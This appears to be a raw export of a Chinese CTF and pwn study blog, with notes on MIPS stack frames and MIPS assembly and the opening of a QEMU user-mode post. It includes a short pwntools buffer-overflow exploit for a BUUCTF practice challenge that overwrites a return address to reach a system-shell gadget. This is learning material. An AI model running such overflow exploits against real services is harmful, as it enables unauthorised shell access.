awk\">sudo gedit <span class=\"hljs-regexp\">/etc/g</span>dm3/custom.conf<br></code></pre></td></tr></table></figure>\n\n<p>将<code>WaylandEnable=false</code>注释掉</p>\n<p>据说是vmware还没有支持ubutnu22.04的默认桌面Wayland</p>\n<h4 id=\"sleep-？\"><a href=\"#sleep-？\" class=\"headerlink\" title=\"sleep ？\"></a>sleep ？</h4><p>题目：</p>\n<p><a href=\"https://buuoj.cn/challenges#mrctf2020_easyrop\">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p>\n<p>本来是很简单的一个溢出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> time <span class=\"hljs-keyword\">import</span> sleep<br><span class=\"hljs-comment\">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">25663</span>)<br>system_sh =<span class=\"hljs-number\">0x000000000040072A</span><br>r.sendline(<span class=\"hljs-string\">b&#x27;2&#x27;</span>)<br><span class=\"hljs-comment\">#sleep(1)</span><br>r.sendline(<span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">0x300</span>)<br>r.sendline(<span class=\"hljs-string\">b&#x27;7&#x27;</span>)<br><span class=\"hljs-comment\">#sleep(1)</span><br>r.sendline(<span class=\"hljs-string\">b&#x27;a&#x27;</span>* <span class=\"hljs-number\">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n<p>但是不加sleep无法通过</p>\n<p>有人说是python同时发送多个字符串时会合并(?)</p>\n<p>那什么时候情况下需要在sendline前面加一个sleep</p>\n<p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p>\n<hr>\n<h4 id=\"binwalk提取固件时快捷方式指向-dev-null\"><a href=\"#binwalk提取固件时快捷方式指向-dev-null\" class=\"headerlink\" title=\"binwalk提取固件时快捷方式指向/dev/null\"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p>\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">WARNING: Symlink points outside of the extraction directory: <span class=\"hljs-regexp\">/home/</span>kali<span class=\"hljs-regexp\">/Desktop/</span>dir815_FW_101<span class=\"hljs-regexp\">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class=\"hljs-regexp\">/htdocs/</span>web<span class=\"hljs-regexp\">/dlcfg.cgi -&gt; /</span>htdocs<span class=\"hljs-regexp\">/cgibin; changing link target to /</span>dev/<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">for</span> security purposes.<br></code></pre></td></tr></table></figure>\n\n<p>用到这个快捷方式时要修改一下</p>\n<h4 id=\"sendlineafter的问题\"><a href=\"#sendlineafter的问题\" class=\"headerlink\" title=\"sendlineafter的问题\"></a>sendlineafter的问题</h4><p>要加上换行符<code>\\n</code>，否则匹配不上</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-selector-tag\">p</span><span class=\"hljs-selector-class\">.sendlineafter</span>(b<span class=\"hljs-string\">&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,...)<br></code></pre></td></tr></table></figure>\n\n\n\n"},{"title":"mips的堆栈","date":"2022-12-23T08:08:00.000Z","excerpt":"mips堆栈知识","_content":"\n#### MIPS的栈💣\n\n1. 栈增长方向：同x86，向低地址增长\n\n2. 没有EBP指针（但是有一个fp，见MIPS汇编这篇文章）\n3. 传参：前四个参数通过$a0~$a3传递，多出的参数放入栈空间\n4. 返回值：$RA寄存器 \n\n#### mips与x86函数调用区别\n\n1. 将$PC寄存器移到$RA寄存器\n2. 如果被调用的函数是如果是非叶函数（调用其他函数），将$RA存在栈；叶函数则不变\n3. 函数返回时，叶函数直接 `jr $RA`，非叶函数先把返回地址存入$RA再跳转\n\n《家用路由器0day漏洞挖掘》这本书上的图例：\n\n![](/img/mips/1.jpg)\n\n\n\n#### 主调函数干的事\n\n##### 演示\n\n1. 创建 `more argument.c`\n\n   ```C\n   //more argument.c\n   #include <stdio.h>\n   int more_arg(int a,int b,int c,int d,int e)\n   {\n       char dst[100] = {0};\n       sprintf(dst,\"%d%d%d%d%d\\n\",a,b,c,d,e);\n   }\n   void main()\n   {\n       int a1=1;\n       int a2=2;\n       int a3=3;\n       int a4=4;\n       int a5=5;\n       more_arg(a1,a2,a3,a4,a5);\n       return ;\n   }\n   ```\n\n2. 编译\n\n   ```\n   mips-linux-gnu-gcc ./more\\ argument.c  -o   more\\ argument\n   ```\n\n3. ida打开\n\n   首先可以看到前四个参数存入了$a0~$a3\n\n   ![](/img/mips/2.jpg)\n\n   然后前面5个：\n   \n   ```assembly\n   li      $v0, ?\n   sw      $v0, 0x??+var_18($fp)\n   ```\n   \n   是赋值操作，因此中间的\n   \n   ```assembly\n   lw      $v0, 0x38+var_8($fp)\n   sw      $v0, 0x38+var_28($sp)\n   ```\n   \n   即为第五个参数的传递\n\n   \n\n#### 被调函数干的事\n\n被调用函数的开头干了以下几件事（仅针对非叶函数）：\n\n```assembly\naddiu   $sp, -0x40\nsw      $ra, 0x38+var_s4($sp)\nsw      $fp, 0x38+var_s0($sp)\nmove    $fp, $sp\n```\n\n首先，抬高sp 0x40个字节***（这里0x40是随便写的）***。然后将ra放到`sp + 0x38 + 4`，fp放到`sp + 0x38 + 0`的位置，也就是被调函数的栈底为ra，然后是fp。最后将fp赋值为sp。\n\n然后需要对参数进行处理，arg_0 到arg_C是主调函数预留出来的空间，需要被调函数再把$a0-$a3存入进去，然后arg_10本身主调函数就已经存好了第五个参数，不需要动。\n\n![](/img/mips/3.jpg)\n\n\n\n\n\n最终主调和被调函数的栈长这样：\n\n![](/img/mips/4.jpg)","source":"_posts/mips汇编/mips堆栈.md","raw":"---\ntitle: mips的堆栈\ntags: [assembly]\ndate: 2022-12-23 16:08:00\ncategories: [mips汇编]\nexcerpt: mips堆栈知识\n---\n\n#### MIPS的栈💣\n\n1. 栈增长方向：同x86，向低地址增长\n\n2. 没有EBP指针（但是有一个fp，见MIPS汇编这篇文章）\n3. 传参：前四个参数通过$a0~$a3传递，多出的参数放入栈空间\n4. 返回值：$RA寄存器 \n\n#### mips与x86函数调用区别\n\n1. 将$PC寄存器移到$RA寄存器\n2. 如果被调用的函数是如果是非叶函数（调用其他函数），将$RA存在栈；叶函数则不变\n3. 函数返回时，叶函数直接 `jr $RA`，非叶函数先把返回地址存入$RA再跳转\n\n《家用路由器0day漏洞挖掘》这本书上的图例：\n\n![](/img/mips/1.jpg)\n\n\n\n#### 主调函数干的事\n\n##### 演示\n\n1. 创建 `more argument.c`\n\n   ```C\n   //more argument.c\n   #include <stdio.h>\n   int more_arg(int a,int b,int c,int d,int e)\n   {\n       char dst[100] = {0};\n       sprintf(dst,\"%d%d%d%d%d\\n\",a,b,c,d,e);\n   }\n   void main()\n   {\n       int a1=1;\n       int a2=2;\n       int a3=3;\n       int a4=4;\n       int a5=5;\n       more_arg(a1,a2,a3,a4,a5);\n       return ;\n   }\n   ```\n\n2. 编译\n\n   ```\n   mips-linux-gnu-gcc ./more\\ argument.c  -o   more\\ argument\n   ```\n\n3. ida打开\n\n   首先可以看到前四个参数存入了$a0~$a3\n\n   ![](/img/mips/2.jpg)\n\n   然后前面5个：\n   \n   ```assembly\n   li      $v0, ?\n   sw      $v0, 0x??+var_18($fp)\n   ```\n   \n   是赋值操作，因此中间的\n   \n   ```assembly\n   lw      $v0, 0x38+var_8($fp)\n   sw      $v0, 0x38+var_28($sp)\n   ```\n   \n   即为第五个参数的传递\n\n   \n\n#### 被调函数干的事\n\n被调用函数的开头干了以下几件事（仅针对非叶函数）：\n\n```assembly\naddiu   $sp, -0x40\nsw      $ra, 0x38+var_s4($sp)\nsw      $fp, 0x38+var_s0($sp)\nmove    $fp, $sp\n```\n\n首先，抬高sp 0x40个字节***（这里0x40是随便写的）***。然后将ra放到`sp + 0x38 + 4`，fp放到`sp + 0x38 + 0`的位置，也就是被调函数的栈底为ra，然后是fp。最后将fp赋值为sp。\n\n然后需要对参数进行处理，arg_0 到arg_C是主调函数预留出来的空间，需要被调函数再把$a0-$a3存入进去，然后arg_10本身主调函数就已经存好了第五个参数，不需要动。\n\n![](/img/mips/3.jpg)\n\n\n\n\n\n最终主调和被调函数的栈长这样：\n\n![](/img/mips/4.jpg)","slug":"mips汇编/mips堆栈","published":1,"updated":"2023-03-14T09:00:10.237Z","_id":"clceua2oi0000h4uf6sx33r9b","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"MIPS的栈💣\"><a href=\"#MIPS的栈💣\" class=\"headerlink\" title=\"MIPS的栈💣\"></a>MIPS的栈💣</h4><ol>\n<li><p>栈增长方向：同x86，向低地址增长</p>\n</li>\n<li><p>没有EBP指针（但是有一个fp，见MIPS汇编这篇文章）</p>\n</li>\n<li><p>传参：前四个参数通过$a0~$a3传递，多出的参数放入栈空间</p>\n</li>\n<li><p>返回值：$RA寄存器 </p>\n</li>\n</ol>\n<h4 id=\"mips与x86函数调用区别\"><a href=\"#mips与x86函数调用区别\" class=\"headerlink\" title=\"mips与x86函数调用区别\"></a>mips与x86函数调用区别</h4><ol>\n<li>将$PC寄存器移到$RA寄存器</li>\n<li>如果被调用的函数是如果是非叶函数（调用其他函数），将$RA存在栈；叶函数则不变</li>\n<li>函数返回时，叶函数直接 <code>jr $RA</code>，非叶函数先把返回地址存入$RA再跳转</li>\n</ol>\n<p>《家用路由器0day漏洞挖掘》这本书上的图例：</p>\n<p><img src=\"/img/mips/1.jpg\"></p>\n<h4 id=\"主调函数干的事\"><a href=\"#主调函数干的事\" class=\"headerlink\" title=\"主调函数干的事\"></a>主调函数干的事</h4><h5 id=\"演示\"><a href=\"#演示\" class=\"headerlink\" title=\"演示\"></a>演示</h5><ol>\n<li><p>创建 <code>more argument.c</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-comment\">//more argument.c</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">more_arg</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> a,<span class=\"hljs-type\">int</span> b,<span class=\"hljs-type\">int</span> c,<span class=\"hljs-type\">int</span> d,<span class=\"hljs-type\">int</span> e)</span><br>&#123;<br>    <span class=\"hljs-type\">char</span> dst[<span class=\"hljs-number\">100</span>] = &#123;<span class=\"hljs-number\">0</span>&#125;;<br>    <span class=\"hljs-built_in\">sprintf</span>(dst,<span class=\"hljs-string\">&quot;%d%d%d%d%d\\n&quot;</span>,a,b,c,d,e);<br>&#125;<br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> a1=<span class=\"hljs-number\">1</span>;<br>    <span class=\"hljs-type\">int</span> a2=<span class=\"hljs-number\">2</span>;<br>    <span class=\"hljs-type\">int</span> a3=<span class=\"hljs-number\">3</span>;<br>    <span class=\"hljs-type\">int</span> a4=<span class=\"hljs-number\">4</span>;<br>    <span class=\"hljs-type\">int</span> a5=<span class=\"hljs-number\">5</span>;<br>    more_arg(a1,a2,a3,a4,a5);<br>    <span class=\"hljs-keyword\">return</span> ;<br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>编译</p>\n<figure class=\"highlight dos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dos\">mips-linux-gnu-gcc ./<span class=\"hljs-built_in\">more</span>\\ argument.c  -o   <span class=\"hljs-built_in\">more</span>\\ argument<br></code></pre></td></tr></table></figure></li>\n<li><p>ida打开</p>\n<p>首先可以看到前四个参数存入了$a0~$a3</p>\n<p><img src=\"/img/mips/2.jpg\"></p>\n<p>然后前面5个：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">li      $v0, ?<br>sw      $v0, 0x??+var_18($fp)<br></code></pre></td></tr></table></figure>\n\n<p>是赋值操作，因此中间的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">lw      $v0, 0x38+var_8($fp)<br>sw      $v0, 0x38+var_28($sp)<br></code></pre></td></tr></table></figure>\n\n<p>即为第五个参数的传递</p>\n</li>\n</ol>\n<h4 id=\"被调函数干的事\"><a href=\"#被调函数干的事\" class=\"headerlink\" title=\"被调函数干的事\"></a>被调函数干的事</h4><p>被调用函数的开头干了以下几件事（仅针对非叶函数）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">addiu   $sp, -0x40<br>sw      $ra, 0x38+var_s4($sp)<br>sw      $fp, 0x38+var_s0($sp)<br>move    $fp, $sp<br></code></pre></td></tr></table></figure>\n\n<p>首先，抬高sp 0x40个字节<em><strong>（这里0x40是随便写的）</strong></em>。然后将ra放到<code>sp + 0x38 + 4</code>，fp放到<code>sp + 0x38 + 0</code>的位置，也就是被调函数的栈底为ra，然后是fp。最后将fp赋值为sp。</p>\n<p>然后需要对参数进行处理，arg_0 到arg_C是主调函数预留出来的空间，需要被调函数再把$a0-$a3存入进去，然后arg_10本身主调函数就已经存好了第五个参数，不需要动。</p>\n<p><img src=\"/img/mips/3.jpg\"></p>\n<p>最终主调和被调函数的栈长这样：</p>\n<p><img src=\"/img/mips/4.jpg\"></p>\n","site":{"data":{}},"more":"<h4 id=\"MIPS的栈💣\"><a href=\"#MIPS的栈💣\" class=\"headerlink\" title=\"MIPS的栈💣\"></a>MIPS的栈💣</h4><ol>\n<li><p>栈增长方向：同x86，向低地址增长</p>\n</li>\n<li><p>没有EBP指针（但是有一个fp，见MIPS汇编这篇文章）</p>\n</li>\n<li><p>传参：前四个参数通过$a0~$a3传递，多出的参数放入栈空间</p>\n</li>\n<li><p>返回值：$RA寄存器 </p>\n</li>\n</ol>\n<h4 id=\"mips与x86函数调用区别\"><a href=\"#mips与x86函数调用区别\" class=\"headerlink\" title=\"mips与x86函数调用区别\"></a>mips与x86函数调用区别</h4><ol>\n<li>将$PC寄存器移到$RA寄存器</li>\n<li>如果被调用的函数是如果是非叶函数（调用其他函数），将$RA存在栈；叶函数则不变</li>\n<li>函数返回时，叶函数直接 <code>jr $RA</code>，非叶函数先把返回地址存入$RA再跳转</li>\n</ol>\n<p>《家用路由器0day漏洞挖掘》这本书上的图例：</p>\n<p><img src=\"/img/mips/1.jpg\"></p>\n<h4 id=\"主调函数干的事\"><a href=\"#主调函数干的事\" class=\"headerlink\" title=\"主调函数干的事\"></a>主调函数干的事</h4><h5 id=\"演示\"><a href=\"#演示\" class=\"headerlink\" title=\"演示\"></a>演示</h5><ol>\n<li><p>创建 <code>more argument.c</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-comment\">//more argument.c</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">more_arg</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> a,<span class=\"hljs-type\">int</span> b,<span class=\"hljs-type\">int</span> c,<span class=\"hljs-type\">int</span> d,<span class=\"hljs-type\">int</span> e)</span><br>&#123;<br>    <span class=\"hljs-type\">char</span> dst[<span class=\"hljs-number\">100</span>] = &#123;<span class=\"hljs-number\">0</span>&#125;;<br>    <span class=\"hljs-built_in\">sprintf</span>(dst,<span class=\"hljs-string\">&quot;%d%d%d%d%d\\n&quot;</span>,a,b,c,d,e);<br>&#125;<br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> a1=<span class=\"hljs-number\">1</span>;<br>    <span class=\"hljs-type\">int</span> a2=<span class=\"hljs-number\">2</span>;<br>    <span class=\"hljs-type\">int</span> a3=<span class=\"hljs-number\">3</span>;<br>    <span class=\"hljs-type\">int</span> a4=<span class=\"hljs-number\">4</span>;<br>    <span class=\"hljs-type\">int</span> a5=<span class=\"hljs-number\">5</span>;<br>    more_arg(a1,a2,a3,a4,a5);<br>    <span class=\"hljs-keyword\">return</span> ;<br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>编译</p>\n<figure class=\"highlight dos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dos\">mips-linux-gnu-gcc ./<span class=\"hljs-built_in\">more</span>\\ argument.c  -o   <span class=\"hljs-built_in\">more</span>\\ argument<br></code></pre></td></tr></table></figure></li>\n<li><p>ida打开</p>\n<p>首先可以看到前四个参数存入了$a0~$a3</p>\n<p><img src=\"/img/mips/2.jpg\"></p>\n<p>然后前面5个：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">li      $v0, ?<br>sw      $v0, 0x??+var_18($fp)<br></code></pre></td></tr></table></figure>\n\n<p>是赋值操作，因此中间的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">lw      $v0, 0x38+var_8($fp)<br>sw      $v0, 0x38+var_28($sp)<br></code></pre></td></tr></table></figure>\n\n<p>即为第五个参数的传递</p>\n</li>\n</ol>\n<h4 id=\"被调函数干的事\"><a href=\"#被调函数干的事\" class=\"headerlink\" title=\"被调函数干的事\"></a>被调函数干的事</h4><p>被调用函数的开头干了以下几件事（仅针对非叶函数）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">addiu   $sp, -0x40<br>sw      $ra, 0x38+var_s4($sp)<br>sw      $fp, 0x38+var_s0($sp)<br>move    $fp, $sp<br></code></pre></td></tr></table></figure>\n\n<p>首先，抬高sp 0x40个字节<em><strong>（这里0x40是随便写的）</strong></em>。然后将ra放到<code>sp + 0x38 + 4</code>，fp放到<code>sp + 0x38 + 0</code>的位置，也就是被调函数的栈底为ra，然后是fp。最后将fp赋值为sp。</p>\n<p>然后需要对参数进行处理，arg_0 到arg_C是主调函数预留出来的空间，需要被调函数再把$a0-$a3存入进去，然后arg_10本身主调函数就已经存好了第五个参数，不需要动。</p>\n<p><img src=\"/img/mips/3.jpg\"></p>\n<p>最终主调和被调函数的栈长这样：</p>\n<p><img src=\"/img/mips/4.jpg\"></p>\n"},{"title":"mip汇编","date":"2022-12-23T08:08:00.000Z","excerpt":"mips汇编基础知识","_content":"\n## MIPS汇编\n\n1. 寄存器\n\n   32个，$0 ~ $31，每个寄存器具体作用见 https://ctf-wiki.org/assembly/mips/readme/\n\n   常见的包括：\n\n| 寄存器  |            作用             |\n| :-----: | :-------------------------: |\n|   $0    |           恒定为0           |\n| $4 - $7 | 函数参数，通常也叫$a0 - $a3 |\n|   $29   |          $sp，栈顶          |\n|   $30   |          $fp，栈帧          |\n|   $31   |        $ra，返回地址        |\n\n除了这32个寄出器，还有$PC和 HI、LO\n\n2. 指令\n\n   MIPS指令为load-store架构，操作数必须先从内存中读取到寄存器里才能运算，**不能直接操作内存**\n\n   |  指令  |                             内容                             |\n   | :----: | :----------------------------------------------------------: |\n   |  beq   |                       branch on equal                        |\n   |  bgez  |      branch on greater than or euqal to zero （≥0跳转）      |\n   | bgezal | （al = and link）  $ra设置为下一条指令然后跳转，相当于跳转到一个函数 |\n   |  bgtz  |           branch on greater than zero （＞0跳转）            |\n   |  bne   |                     branch on not equal                      |\n   |  jal   |       jump and link 过程调用，会将$ra设置为下一条指令        |\n\n   运算：乘法会将结果高32位存入HI，低32位存入LO\n   \n   ​\t\t\t除法会将余数存入HI，商存入LO\n   \n   三个操作数，都是将右边两个的计算存入左边的，例如 or $d,$s,$t ，d = s | t\n   \n   \n   \n   \n\n","source":"_posts/mips汇编/mips汇编.md","raw":"---\ntitle: mip汇编\ntags: [assembly]\ndate: 2022-12-23 16:08:00\ncategories: [mips汇编]\nexcerpt: mips汇编基础知识\n---\n\n## MIPS汇编\n\n1. 寄存器\n\n   32个，$0 ~ $31，每个寄存器具体作用见 https://ctf-wiki.org/assembly/mips/readme/\n\n   常见的包括：\n\n| 寄存器  |            作用             |\n| :-----: | :-------------------------: |\n|   $0    |           恒定为0           |\n| $4 - $7 | 函数参数，通常也叫$a0 - $a3 |\n|   $29   |          $sp，栈顶          |\n|   $30   |          $fp，栈帧          |\n|   $31   |        $ra，返回地址        |\n\n除了这32个寄出器，还有$PC和 HI、LO\n\n2. 指令\n\n   MIPS指令为load-store架构，操作数必须先从内存中读取到寄存器里才能运算，**不能直接操作内存**\n\n   |  指令  |                             内容                             |\n   | :----: | :----------------------------------------------------------: |\n   |  beq   |                       branch on equal                        |\n   |  bgez  |      branch on greater than or euqal to zero （≥0跳转）      |\n   | bgezal | （al = and link）  $ra设置为下一条指令然后跳转，相当于跳转到一个函数 |\n   |  bgtz  |           branch on greater than zero （＞0跳转）            |\n   |  bne   |                     branch on not equal                      |\n   |  jal   |       jump and link 过程调用，会将$ra设置为下一条指令        |\n\n   运算：乘法会将结果高32位存入HI，低32位存入LO\n   \n   ​\t\t\t除法会将余数存入HI，商存入LO\n   \n   三个操作数，都是将右边两个的计算存入左边的，例如 or $d,$s,$t ，d = s | t\n   \n   \n   \n   \n\n","slug":"mips汇编/mips汇编","published":1,"updated":"2023-03-14T06:34:13.846Z","_id":"clf7vmaze0000isuff5n56ile","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"MIPS汇编\"><a href=\"#MIPS汇编\" class=\"headerlink\" title=\"MIPS汇编\"></a>MIPS汇编</h2><ol>\n<li><p>寄存器</p>\n<p>32个，$0 ~ $31，每个寄存器具体作用见 <a href=\"https://ctf-wiki.org/assembly/mips/readme/\">https://ctf-wiki.org/assembly/mips/readme/</a></p>\n<p>常见的包括：</p>\n</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th align=\"center\">寄存器</th>\n<th align=\"center\">作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">$0</td>\n<td align=\"center\">恒定为0</td>\n</tr>\n<tr>\n<td align=\"center\">$4 - $7</td>\n<td align=\"center\">函数参数，通常也叫$a0 - $a3</td>\n</tr>\n<tr>\n<td align=\"center\">$29</td>\n<td align=\"center\">$sp，栈顶</td>\n</tr>\n<tr>\n<td align=\"center\">$30</td>\n<td align=\"center\">$fp，栈帧</td>\n</tr>\n<tr>\n<td align=\"center\">$31</td>\n<td align=\"center\">$ra，返回地址</td>\n</tr>\n</tbody></table>\n<p>除了这32个寄出器，还有$PC和 HI、LO</p>\n<ol start=\"2\">\n<li><p>指令</p>\n<p>MIPS指令为load-store架构，操作数必须先从内存中读取到寄存器里才能运算，<strong>不能直接操作内存</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">指令</th>\n<th align=\"center\">内容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">beq</td>\n<td align=\"center\">branch on equal</td>\n</tr>\n<tr>\n<td align=\"center\">bgez</td>\n<td align=\"center\">branch on greater than or euqal to zero （≥0跳转）</td>\n</tr>\n<tr>\n<td align=\"center\">bgezal</td>\n<td align=\"center\">（al = and link）  $ra设置为下一条指令然后跳转，相当于跳转到一个函数</td>\n</tr>\n<tr>\n<td align=\"center\">bgtz</td>\n<td align=\"center\">branch on greater than zero （＞0跳转）</td>\n</tr>\n<tr>\n<td align=\"center\">bne</td>\n<td align=\"center\">branch on not equal</td>\n</tr>\n<tr>\n<td align=\"center\">jal</td>\n<td align=\"center\">jump and link 过程调用，会将$ra设置为下一条指令</td>\n</tr>\n</tbody></table>\n<p>运算：乘法会将结果高32位存入HI，低32位存入LO</p>\n<p>​            除法会将余数存入HI，商存入LO</p>\n<p>三个操作数，都是将右边两个的计算存入左边的，例如 or $d,$s,$t ，d = s | t</p>\n</li>\n</ol>\n","site":{"data":{}},"more":"<h2 id=\"MIPS汇编\"><a href=\"#MIPS汇编\" class=\"headerlink\" title=\"MIPS汇编\"></a>MIPS汇编</h2><ol>\n<li><p>寄存器</p>\n<p>32个，$0 ~ $31，每个寄存器具体作用见 <a href=\"https://ctf-wiki.org/assembly/mips/readme/\">https://ctf-wiki.org/assembly/mips/readme/</a></p>\n<p>常见的包括：</p>\n</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th align=\"center\">寄存器</th>\n<th align=\"center\">作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">$0</td>\n<td align=\"center\">恒定为0</td>\n</tr>\n<tr>\n<td align=\"center\">$4 - $7</td>\n<td align=\"center\">函数参数，通常也叫$a0 - $a3</td>\n</tr>\n<tr>\n<td align=\"center\">$29</td>\n<td align=\"center\">$sp，栈顶</td>\n</tr>\n<tr>\n<td align=\"center\">$30</td>\n<td align=\"center\">$fp，栈帧</td>\n</tr>\n<tr>\n<td align=\"center\">$31</td>\n<td align=\"center\">$ra，返回地址</td>\n</tr>\n</tbody></table>\n<p>除了这32个寄出器，还有$PC和 HI、LO</p>\n<ol start=\"2\">\n<li><p>指令</p>\n<p>MIPS指令为load-store架构，操作数必须先从内存中读取到寄存器里才能运算，<strong>不能直接操作内存</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">指令</th>\n<th align=\"center\">内容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">beq</td>\n<td align=\"center\">branch on equal</td>\n</tr>\n<tr>\n<td align=\"center\">bgez</td>\n<td align=\"center\">branch on greater than or euqal to zero （≥0跳转）</td>\n</tr>\n<tr>\n<td align=\"center\">bgezal</td>\n<td align=\"center\">（al = and link）  $ra设置为下一条指令然后跳转，相当于跳转到一个函数</td>\n</tr>\n<tr>\n<td align=\"center\">bgtz</td>\n<td align=\"center\">branch on greater than zero （＞0跳转）</td>\n</tr>\n<tr>\n<td align=\"center\">bne</td>\n<td align=\"center\">branch on not equal</td>\n</tr>\n<tr>\n<td align=\"center\">jal</td>\n<td align=\"center\">jump and link 过程调用，会将$ra设置为下一条指令</td>\n</tr>\n</tbody></table>\n<p>运算：乘法会将结果高32位存入HI，低32位存入LO</p>\n<p>​            除法会将余数存入HI，商存入LO</p>\n<p>三个操作数，都是将右边两个的计算存入左边的，例如 or $d,$s,$t ，d = s | t</p>\n</li>\n</ol>\n"},{"title":"qemu的安装与仿真第一个mips程序","date":"2022-12-23T07:33:00.000Z","excerpt":"qemu的user-mode使用方法","_content":"\n#### QEMU安装\n\nQEMU仿真程序分为两类：使用者模式（User Mode）、系统模式（System Mode）。区别在于User Mode只仿真单个程序，而System Mode仿真整个计算机系统，类似vmware\n\n##### 使用者模式\n\n安装：`sudo apt-get install qemu-user[-static]`\n\n使用（以mips为例）：\n\n\n```shell\ncd <path-to-fsroot>\ncp $(which qemu-mipsel-static) ./\nsudo chroot . ./qemu-mipsel-static 